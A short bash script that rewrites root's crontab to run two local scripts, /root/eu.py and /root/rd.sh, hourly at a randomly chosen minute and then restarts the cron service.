#!/bin/bash

sed -i '/python3/d' /var/spool/cron/crontabs/root
echo $[$(($RANDOM%6))] "* * * * /usr/bin/python3 /root/eu.py > /dev/null 2>&1; /bin/bash /root/rd.sh > /dev/null 2>&1" >> /var/spool/cron/crontabs/root
service cron restart
